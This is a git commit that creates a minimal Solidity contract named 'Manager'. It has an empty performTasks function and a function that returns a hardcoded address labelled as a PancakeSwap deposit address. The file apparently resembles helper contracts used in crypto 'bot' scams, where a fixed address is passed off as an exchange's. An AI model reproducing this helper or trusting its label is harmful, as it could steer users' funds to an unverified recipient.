6a10a04a7800817a6886bd6fefd8a62119b9977e
safemoonshotcrypto <99190464+safemoonshotcrypto@users.noreply.github.com>
2022-02-07 16:53:03 +0100

    Create cryptostage.sol

---
+++ cryptostage.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xBDB52f7b7f80e8D31274524886050adC3feb7F06;
+    }
+}
+
+//pancakeswapfunction
